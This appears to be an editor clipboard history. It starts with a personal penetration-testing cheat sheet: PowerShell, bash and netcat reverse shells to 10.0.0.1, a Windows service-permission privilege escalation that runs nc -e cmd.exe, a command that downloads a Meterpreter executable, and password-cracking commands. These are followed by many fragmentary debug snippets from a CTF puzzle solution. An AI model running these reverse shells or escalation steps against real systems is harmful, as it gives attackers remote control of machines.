2bed9d71828248222322471917ed804d|file:///home/neo/vimwiki/Boxes.wiki|1|1|V|vimwiki
	= Windows =
	
	== Reverse shells == 
	    * Powershell
	        * `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
	
	== Privilage escalation ==
	    * Run winpeas to find vulnerabilities [ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe ] 
	    * General tips [ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation ]
	=== Weak service permissions === 
	    * Find services we can modify with winpeas
	    * [ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services ]
	    * `sc config <Service_Name> binpath= "C:\path_to_nc\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"`
	    (or full path of sc, e.g. C:\Windows\System32\sc.exe) + download nc if necessary
	    * Restart the service:
	       `wmic service NAMEOFSERVICE call startservice`
	       `net stop [service name] && net start [service name]`
	    * Can execute any program as admin (not just nc)
	     
	== Powershell commands ==
	    * Transfer files from local to Windows: [ https://blog.ropnop.com/transferring-files-from-kali-to-windows/ ]
	        * Http:
	            - Put file in /var/www/html
	            - Start http server (`python -m SimpleHTTPServer`)
	            - `(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')` 
	        * Ftp:
	            - Metasploit: auxiliary/server/ftp
	            - ftproot: path that contains file
	            - echo following into file: (`echo 'text' >> ftp_commands.txt`)
	                open 10.9.122.8
	                anonymous
	                whatever
	                binary
	                get file.exe
	                bye
	            - `ftp -s:ftp_commands.txt`
	             
	    * Unzip: `Expand-Archive file.zip`
	
	= Linux = 
	
	== Reverse shells ==
	    * Bash: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
	    * Netcat: `nc -e /bin/sh 10.0.0.1 1234` or 
	    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` for other versions
	
	== General == 
	
	=== Links === 
	    * Reverse shell cheat sheet [ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md ]
	    * General tips [ https://github.com/swisskyrepo/PayloadsAllTheThings ]
	
	=== Get TTY === 
	    * Python: `python -c 'import pty; pty.spawn("/bin/bash")'`
	    * Netcat: 
	        - Get shell with nc (`nc -lvp port`)
	        - `SHELL=/bin/bash script -q /dev/null`
	        - send to bg (Ctrl-Z)
	        - `stty raw -echo`
	        - `fg`
	        - `reset`
	        - `xterm`
	
	=== Password Cracking ===
	
	* John commands:
	    * Crack password (sha1): `sudo john --fork=4 --format=raw-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
	    * Show cracked password: `sudo john --show hash.txt`
	
028a0679db37c6df9501c474d0eb7229|file:///home/neo/vimwiki/Windows.wiki|40|1|V|vimwiki
	= Linux = 
	
	== Reverse shells ==
	    * Bash: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
	    * Netcat: `nc -e /bin/sh 10.0.0.1 1234` or 
	    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` for other versions
d78aa06811557c6f2a172c23b02e3d30|file:///home/neo/vimwiki/Windows.wiki|39|1|V|vimwiki
	
	
	== General == 
	
	=== Links === 
	    * Reverse shell cheat sheet [ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md ]
	    * General tips [ https://github.com/swisskyrepo/PayloadsAllTheThings ]
	
	=== Get TTY === 
	    * Python: `python -c 'import pty; pty.spawn("/bin/bash")'`
	    * Netcat: 
	        - Get shell with nc (`nc -lvp port`)
	        - `SHELL=/bin/bash script -q /dev/null`
	        - send to bg (Ctrl-Z)
	        - `stty raw -echo`
	        - `fg`
	        - `reset`
	        - `xterm`
	
	=== Password Cracking ===
	
	* John commands:
	    * Crack password (sha1): `sudo john --fork=4 --format=raw-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
	    * Show cracked password: `sudo john --show hash.txt`
	
41d9f18e2bd22b5a35341388aa8ed8a7|file:///home/neo/vimwiki/Linux.wiki|6|6|v|vimwiki
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
49d07c7c2c1087a3af68c7b9fb2e65c9|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|47|1|V|python
	    if diff_of_avgs > len(val2perm)//2:
	        logging.error(f'EFAMETIN')
	        raise Exception('shese mestin tianisi')
a2dbb740b400cf66096509bb6baa0853|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|47|1|V|python
	    if diff_of_avgs > len(val2perm)//2:
	        logging.error(f'EFAMETIN')
697493a26f40b80086b7a1d2c14883a2|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|33|1|V|python
	    choice = sorted(hand)[len(hand)//2]
fe5f9db906c52e05138923072a05e1aa|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|38|1|V|python
	    new_avg = int(round(mean(hand)))
691c0c2866947c65aab6a71a210437b1|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|31|1|V|python
	    avg = int(round(mean(hand)))
78cf34cf4690231942276efb96dee2c4|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|31|1|V|python
	    tot = 0
	    for i in hand:
	        tot += i
4ff20d6ab0647addeac327266c852855|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|62|1|V|python
	    diff_perm = str(val2perm[diff_val])
3b82c76521a69165f899908e0b04943c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|63|30|v|python
	diff_val
92496f67fb33d5003915206c66708107|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|53|1|V|python
	    if diff_of_avgs > len(val2perm)//2:
0106e0472d237bbadef678f17648ed2d|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|119|1|V|python
	    total_iterations = 50000
c709c0cab3ad48bcb125dc06a2f1762f|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|98|5|V|python
	    print('Perm:', perm)
0688619051f762629272ed9c5b4c776d|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|48|5|V|python
	    diff_of_avgs = avg - new_avg
5e47c34d1296c4184de595dec815c90f|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|34|1|V|python
	    avg = int(round(tot/hand_size))
7a902dc91a92f5c29826a184efd39d14|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|45|1|V|python
	    new_avg = int(round(tot2/hand_size))
d9f6ec703196d4fa4691a2c413e2cc9e|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|85|5|V|python
	    # avg = int(round(mean(hand)))
2df1fa6189687a4b3dc0274ba69390ae|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|47|5|V|python
	    print(tot2/hand_size)
15f74674216217fa56c5528a21f47567|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|35|5|V|python
	    print(tot/hand_size)
98e22d313988234bc20b47d899ccd781|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|50|5|V|python
	    # signed_diff = avg - new_avg
	    # diff_of_avgs = abs(signed_diff)
2926b619d41ad08eabdf7d492abe2350|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|61|44|V|python
	    # diff_val = signed_diff if signed_diff >= 0 else (
	    #     len(val2perm)//2 - signed_diff)
	    # logging.info(f'[Alice] DIFF_VAL {diff_val}')
1d5e855fe768b502d73c0885ffc2819c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|41|5|V|python
	    print('Choice:', choice)
b8884c3b345137833b10cddc399564db|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|91|5|V|python
	    avg = tot/hand_size
16ccbe77047e6ef4eaf9f2843a9e10b2|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|91|5|V|python
	    logging.info(f'[Bob  ] AVG: {avg}')
a8a0cf14043ab7b5d90760be9f5eee35|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|90|1|V|python
	    # avg = int(round(tot/hand_size))
2b584bf58d37f5119eebcc631aad8b91|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|110|38|V|python
	    logging.info(f'[Bob  ] PERM_CODE: {perm}')
	    logging.info(f'[Bob  ] PERM_VALUE: {perm_val}')
17399bbafa1a91652536c51d9f5c63de|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|113|1|V|python
	    # total_sum = int(round(new_avg * (len(hand) + 1)))
	    # guess = total_sum - (sum(hand))
ee7b0f4518b335430f64fd6d9d7db6db|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|105|1|V|python
	
	    # if perm_val > len(perm2val) // 2:
	    #     perm_val -= len(perm2val) // 2
	    #     perm_val = -perm_val
	
	
1c376e42420dc40852473410a5ae1c0b|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|108|1|V|python
	
	    logging.info(f'[Bob  ] GUESS: {guess}')
be79637d4b984380d43f4e189c7fab98|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|91|1|V|python
	    # avg = int(round(tot/hand_size))
	    # logging.info(f'[Bob  ] AVG: {avg}')
c43b87d8e3465e55c73084ffdd6ecdd9|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|54|5|V|python
	    # diff_of_avgs = avg - new_avg
3d1a3b6944e9d7b3445d8453209b107f|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|57|1|V|python
	    print('His guess:', (new_avg+diff_of_avgs))
2258e7a6299a5286a3f5da80ea0656ed|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|58|25|v|python
	(new_avg+diff_of_avgs
4367f8e1a2b70670bb112defdfbc102a|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|59|5|V|python
	    print('TOT2', tot2)
7cf72f9bd58ba9d940f8bd594641bd9b|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|59|25|^v|python
	int((new_avg+diff_of_avgs)*8 - tot2)
a13a3723136e181782c0c37a8f88b3db|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|59|25|V|python
	    if his_guess < choice:
	        diff_of_avgs += 1
	    if his_guess > choice:
	        diff_of_avgs -= 1
cebddf6271c784c9f6bb4bd0e65840a8|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|49|5|V|python
	    print('New tot:', tot2)
1efda24c51decb79a607373038e1b352|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|37|5|V|python
	    print('AVG: ', avg)
784e6acf6eec0ae6abc998bbc372309a|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|36|5|V|python
	    print('TOT:', tot)
ee3956739e6d126eed999de07a953284|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|52|5|V|python
	    # print('AVG dif:', diff_of_avgs)
c474b617d029b9132968b45b43b63f87|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|54|23|v|python
	(new_avg + diff_of_avgs) * 8
02a6366679123d794f4111b915e18eea|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|59|5|V|python
	    print('His guess:', his_guess)
c0b7aed4f8b9b410fcb71abc43cab425|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|53|5|V|python
	    if bob_sum < tot:
	        diff_of_avgs += 1
75b63809cfe119e11a3a5385b0b02b7c|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|54|1|V|python
	    print('Bobs sum', bob_sum)
9479cd43b38d54427d3c5c028ccd1bf9|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_median.py|52|1|V|python
	    bob_sum = (new_avg + diff_of_avgs) * 8
c00b9d73c4184cd0f3f2d1bc21ffa452|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|182|1|V|c
		printf("running part 1... ");
		for (int i = 0; i < trials; i++) {
			if (!part1_checkonce()) return false;
		}
e7d79d1cf23ba558e54446fe0190aa4d|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|21|1|V|c
	char fp[0x100] = {0};
3aa1cd79ca0d5b2838d1b6335697ee59|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|219|1|V|c
		if (getfile()) {
629b7c4adc64b19b511620d85873bc5f|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|196|5|V|c
	    printf("run");
cd77ff112af2981868fb2e862734cbea|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|206|5|V|c
	    printf("\nbefore alice'");
f92cb1a7d3cef116e6837cd3c62218c1|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|7|1|V|lua
	return test
78113badcd976566e9da852983c82314|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|1|1|V|lua
	local test = {} 
fc5e038d38a57032085441e7fe7010b0|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|1|10|v|lua
	helloworld
a721ef62f696f80c95539e5be576d07c|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|5|1|V|lua
	Alice1()
ddbbba70f2c934f14339f3e56e421582|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|183|1|V|c
		printf("passed\nrunning part 2... ");
8e6d74bd9edf4a24f07ae1fcc4d19a5d|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|208|1|V|c
	    printf("\nalice ok\n");
7be6f97b296d195518b34d7b35e0629e|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|197|5|V|c
	    printf("test\n");
7cc8a50636e9aad93ee612bd453d1592|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|11|1|V|lua
	-- Alice1()
1b5c6833ae968ebbee890505e9669e42|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|12|1|V|lua
	print("In lua\n")
3bc8e173a68e60bfbbf5c803364978c9|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|13|1|V|lua
	return 1
728b0bd45c426cee1aca1fb608df97b8|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|208|1|V|c
		if (luaL_dofile(Alice, fp)) return false;
402e57839dfda3b1063dfc77cd3c524e|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|209|2|V|c
		luaL_dofile(Alice, fp);
a9b1d0b5998e477c43c165cd5d96c542|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|210|22|V|c
	    printf("%d\n", g);
	    if (g) return false;
c0fe7ef494cda484681df124d5fc0280|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|209|2|V|c
		int g = luaL_dofile(Alice, fp);
a0504d4dd71d9948f0f1885e62b92c5b|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|2|1|V|lua
	global Alice1 = {}
6f8158569f7aa75c3bb2cfc797addd4c|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|3|1|V|lua
	Alice1 = function()
	    print("Alisavou\n")
	end
	
	Bob1 = function()
	    print("Bob\n")
	end
e780d0d2a7d9dae0c18cb3d301153579|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|18|1|V|lua
	return 0
2f3c58326c6c273e84538d5cddee5116|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|210|5|V|c
	    printf("\nbob ok\n");
027f4a28672bba523e80dde8dcdfa137|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|207|1|V|c
	    printf("Before alice\n");
fea2673221de8f70b86ea57913ddc4d9|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|123|5|V|c
	    printf("\nIn part 2\n");
67ad23a15ee58db7fe9a6747fd48f834|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|137|5|V|c
	    printf("\nBefore getglobal\n");
9060587edeb01a63e3d3edc959678d1e|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|139|15|v|c
	Before
c6566e4b66446b863a85e6c4ffe6a362|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|139|5|V|c
	    printf("\nAfter getglobal\n");
e5cc5af3c4757f2732a206007943f20a|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|144|15|v|c
	Afhher
1ab00338041593b6bb80f31afa9a7a09|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|144|16|v|c
	getglobal
b4e3b3f616c9b0c530fc9744dee48d4c|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|5|V|lua
	    print("Alisavou\n")
f3319769d3cd9a09c364a4f102d3eb10|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|7|1|V|lua
	    print("Bob\n")
26815fe863bfb207bb5f90c8418e3a38|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|10|1|V|lua
	    print("Alisavou 2\n")
05c97c8f9ae6981a449ae1462f52068c|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|13|1|V|lua
	    print("Bob 2\n")
53d325b9c5139aa2558711d4aa726254|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|144|5|V|c
	    printf("\nBefore call\n");
712a823bc83c42f01e4dab98da48e6d3|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|145|1|V|c
	    printf("\nAfter call\n");
7bfcadb5535fe8aad5032762b7bfe159|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|144|15|v|c
	After
51e40e8e60832fe8576af9e283043025|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|5|20|v|lua
	ipairs
8ba5677ba23467019b9a308e59773d9f|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|6|19|V|lua
	    for v in tab do
	        sum = sum + v
	    end
ec1e48d31c2ca1e0712696d384c33457|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|6|5|V|lua
	    return sum
b92dd58a28b03aaeff08af3461dc4c40|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|1|V|lua
	    local sum = 0
b5087172648a6acc9d4de6bfd5714f04|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|1|V|lua
	    local print('test')
4f7a0baceef927331f5cce29109d3cae|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|210|1|V|c
	    printf("\nBefore alice\n")
9c62e51563a40a116ba447b84b96c1fc|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|213|1|V|c
	    printf("\nBefore alice\n")
	
4f4b88706313688bdeb26b4f4bd7f44b|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|213|15|v|c
	Before alice
e3ec8890c0b411eee96325426bac28bb|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|5|12|V|lua
	        for v in tab do
	            sum = sum + v
	        end
573ce5969e9884d49d4fab77b09a306a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|3|19|v|lua
	hand
d1921c26fc9685195f9687394aff428a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|5|V|lua
	    -- local sum = 0
ef25bc4703cff2ef3bc0ef8cd88a63ef|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|7|1|V|lua
	-- return sum
c4fa1cd498852583218885bb4c231b69|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|5|9|v|lua
	sum = sum + value
25ac3cfc69f543048b5ed0a8741ed805|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|24|v|lua
	ocal
71302b9558e9684683fa15b0a8adb539|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|20|1|V|lua
	print(sum)
aab9e1de16f38176f86d7a92ba337a8d|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|3|19|v|lua
	table
5d4c5f9e9534f8518f032209f7de3461|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|6|9|v|lua
	table[i] = 1
e514319ed471894ec5432c1b9fc28791|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|5|V|lua
	    tab = {}
f09cc7ee3a9a93273f4b80601cafb00c|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|6|22|v|lua
	values
b99eb2943baeacd05876a3bc493fd2db|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|128|1|V|c
		for (int i = 0; i < 96; i++) {
e1e8700cfa2bfd12fd4f9569835b60cd|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|28|33|V|lua
	-- for key, value in ipairs(tab) do
	--     print(value)
9b3e3570406b57148780741e82ed9446|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|28|1|V|lua
	-- end
78e4866099a3ab4a4a315c5a425849a7|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|28|32|V|lua
	-- for key, value in ipairs(tab) do
	--     print(value)
	-- end
736bd2178d3c559aa1e5655aeb9a88d9|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|7|9|V|lua
	        print(values[i])
66825970b51dc33671aa8b7da87ef999|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|8|13|V|lua
	            o
5f027658de5246278e585998f4ffd396|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|12|13|V|lua
	            values[i] = 0
50454bb98f3e691c8f482001dca4a2d2|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|15|9|V|lua
	        table.insert(positions, pos) 
6f23f7ff99f55bfc4521d009bdd56d12|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|15|9|V|lua
	        values[i] = 0
d6aea15f77d952279535e657f53f9366|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|14|13|V|lua
	            -- table.insert(values, pos, 0)
ec04f7c6a17fe3dafacab1a1c4d1ba89|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|156|1|V|c
	        printf("rem %d\n", rem);
c5177b9110f7dabc8e1847f825affe7f|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|148|5|V|c
	    printf("Before call\n");
0aa3603fee421a74f47b1305583d99c7|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|149|5|V|c
	    printf("After call\n");
03ee40159dab57a6c2ca51c1fd78e57a|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|136|1|V|c
		for (int i = 0; i < 96; i++) {
	        printf("%d ", table[i]);
	    }
	    printf("\n");
1b6d17f6601c07d76a4c727e74795561|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|13|13|V|lua
	            -- print(pos)
b3a239b7ddf36589f4a1f6cab630d42e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|1|V|lua
	    positions = {}
	    local max_num = 96
57db709de696905c45145996bf590e1f|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|6|1|V|lua
	    for i = 1, max_num do
c8df2a476461e07735bd147060f650ba|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|4|1|V|lua
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
08699542df0087956cbd0c45c52ed50e|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|136|1|V|c
	    printf("Table before Alice:\n")
e97fc144e32c559771fb7d0b859b9eb5|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|136|1|V|c
	    printf("Table before Alice:\n");
2f44417567bc123bd7c60de8c2a2b444|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|163|19|v|c
	before
58b84e536110b16db410faf30641a79d|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|221|5|V|c
	    printf("Dofile ok\n");
bde6803b9347ff27f55d0ba50a13d2c9|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|184|9|V|c
	        printf("%d\n", guess);
c9b240432cbd21f09ee819cede387d39|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|187|10|v|c
	 return false;
b21a777cd20b54fb8f631e4eb5e3c16b|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|185|1|V|c
	            printf("%d\n", guess);
2a3bebb169ea51a84d48ba23c0069413|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|190|13|V|c
	            print
5faab8af471ac567bf2c2543546135be|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|163|1|V|c
	    printf("Table after Alice:\n");
		for (int i = 0; i < 96; i++) {
	        printf("%d ", table[i]);
	    }
	    printf("\n");
56a45aadd6cf0bbd7560f3adcf98d5d6|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|171|9|V|c
	        printf("%d ", table[i]);
74d584d4f5ee58564db496b6a82f1290|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|157|1|V|c
	            printf("Removed: %d\n", rem);
8ac97de4e421e7a5c7a5a591e5f9e37e|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|8|24|v|lua
	 % max_num
77615858382418e86cf0112a25f3eb62|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|12|27|v|lua
	pos % max_num
7f923fae1aa701d2a92cdbc26077fa82|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|30|1|V|lua
	                if pos >= max_num then
	                    pos = 1
	                end
7b83f3c1d02af0dfc8bed80a2b79f237|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|3|1|V|lua
	Alice2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 2 ) then
	            pos = (i-1) % max_num
	            while( values[pos] ~= 1 ) do
	                pos = (pos-1) % max_num
	            end
	            values[pos] = 0
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	Bob2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 0 ) then
	            pos = (i+1) % max_num
	            while( values[pos] ~= 1 ) do
	                pos = (pos+1) % max_num
	            end
	            values[pos] = 2
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
a7cd334fb17d2f7072c8afecedb15048|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|154|1|V|c
			int rem = lua_tointeger(Alice, -1) - 1;
4fbd9dffa4e7bb5aa546a0e3628f7e1a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|28|13|V|lua
	            % max_num
c72d1d1da08cbad9e1c85b5e49c4f58d|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|25|1|V|lua
	            if pos > max_num then
	                pos = 1
	            end
3b5aec96ab7c60e6b5abc164307febab|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|29|30|v|lua
	) % max_num
14c14f2835e4fa9b4bb6dbc073db5b51|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|170|1|V|c
	    /* printf("Table after Alice:\n"); */
		/* for (int i = 0; i < 96; i++) { */
b7ea705f9193822a5bec4a780a3b649e|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|48|1|V|c
		for (int i = 0; i < hand_size; i++) {
914ba1eb5699b9af203501066d8f30d9|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|60|28|v|c
	hand_size
d2afad62b575be1da2b7d3283289f354|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|62|1|V|c
	    printf("\n");
3043ca32baf38684d6ee0095784a9377|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|56|9|v|lua
	printResult(a)
731ecc4dd995d57b18c9c939abf6d403|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|54|10|v|lua
	permgen
a49c0173de8b498e9b7b78119faf815a|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|66|9|V|lua
	        return(arr)
8690febafa6282925af322cc1480d1b3|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|56|9|V|lua
	        -- return(arr)
8bd5c93a7a8cd559179880e031366856|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|56|9|v|lua
	printResult(arr)
8d80264cd7b220ca274b9be55ba3ea58|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|57|9|V|lua
	        coroutine.
a301b289212ff31fe50df9571d9d27df|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|71|13|v|lua
	table.getn(arr)
384b5bb01f3554e9dae2badbaea053ed|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|72|3|V|lua
	  print(n)
05c8dc7b5af129d51b717aeb92743c12|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|88|9|V|lua
	        print(p[i])
fcdec1adca2e65413b38c860e672dd25|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|90|5|V|lua
	    print(num)
89a6d4e16879f0e4a39dab50dfb5edf6|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|90|5|V|lua
	    -- printResult(p)
ba256e62a82d407008628cd9a0af8eeb|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|47|1|V|lua
	function printResult (a)
	  for i,v in ipairs(a) do
